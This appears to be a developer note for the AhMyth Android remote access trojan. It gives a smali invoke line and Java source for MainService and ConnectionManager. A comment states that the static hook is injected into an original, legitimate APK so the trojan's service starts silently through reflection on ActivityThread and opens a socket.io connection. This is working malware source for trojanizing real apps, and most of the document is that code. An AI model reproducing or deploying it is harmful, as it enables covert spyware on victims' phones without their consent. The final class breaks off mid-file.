## New Hook Method
```smali
invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
```
## Java Code for static hook function
- MainActivity.java
```java
MainService.startService(this);
```
- MyReciever.java
```java
MainService.startService(context);
```
- MainService.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;

import java.lang.reflect.Method;

public class MainService extends Service {
    private static Context contextOfApplication;

        private static void findContext() throws Exception {
            Class<?> activityThreadClass;
            try {
                activityThreadClass = Class.forName("android.app.ActivityThread");
            } catch (ClassNotFoundException e) {
                // No context
                return;
            }

            final Method currentApplication = activityThreadClass.getMethod("currentApplication");
            final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
            if (context == null) {
                // Post to the UI/Main thread and try and retrieve the Context
                final Handler handler = new Handler(Looper.getMainLooper());
                handler.post(new Runnable() {
                    public void run() {
                        try {
                            Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                            if (context != null) {
                                startService(context);
                            }
                        } catch (Exception ignored) {
                        }
                    }
                });
            } else {
                startService(context);
            }
        }

        // Smali hook point
        public static void start() {
            try {
                findContext();
            } catch (Exception ignored) {
            }
        }

        public static void startService(Context context) {
            context.startService(new Intent(context, MainService.class));
        }
```
- ConnectionManager.java
```java
package ahmyth.mine.king.ahmyth;

import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.util.Log;
import android.os.Looper;
import android.os.Handler;

import java.lang.reflect.Method;

/**
 * Created by AhMyth on 10/1/16.
 */

/**
 * Updated by Morsmalleo
 */



public class ConnectionManager {

    public static Context context;

    private static io.socket.client.Socket ioSocket;

    private static FileManager fm = new FileManager();

    public static void startAsync(Context con)

    {

        try {

            ConnectionManager.context = con;

            sendReq();

        }catch (Exception ex){

            startAsync(con);

        }

    }

    public static void start(Context context) {
        ConnectionManager.context = context;
    }

    // static smali hook that gets injected into 
    // an original, legit APK
    public static void startContext() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            start(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            start(context);

        }

    }
```
